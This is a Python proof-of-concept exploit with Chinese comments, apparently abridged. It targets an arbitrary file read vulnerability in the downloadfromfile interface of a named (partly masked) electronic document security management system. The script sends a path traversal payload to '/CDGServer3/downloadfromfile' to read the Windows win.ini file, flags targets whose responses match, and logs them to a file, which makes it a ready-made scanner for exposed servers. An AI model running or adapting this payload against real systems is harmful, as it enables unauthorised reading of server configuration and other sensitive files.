# -*- coding: utf-8 -*-
# 某赛通电子文档安全管理系统 downloadfromfile 任意文件读取漏洞
...
# 漏洞概述:某赛通电子文档安全管理系统downloadfromfile接口处存在任意文件读取漏洞，攻击者除了可以利用任意文件读取漏洞获取服务器的内部配置文件信息
...
def banner():
    test = """ 
                ...
                \x1b[33m   ╚═╝   ╚══════╝       ╚═════╝╚═════╝  ╚═════╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    --author:Kucei  --Version:某赛通电子文档安全管理系统 downloadfromfile 任意文件读取漏洞
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)
...
def main():
    banner()
    parser = argparse.ArgumentParser('某赛通电子文档安全管理系统 downloadfromfile 任意文件读取漏洞')
...
def poc(target):
    url_payload = "/CDGServer3/downloadfromfile"
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    data = "fileName=../../../../../../../../../../../windows/win.ini"
    try :
        ...
        if response.status_code == 200 and 'for 16-bit app support' in response.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('YS-downloadfromfile_ReadFile.txt','a',encoding='utf-8')as f:
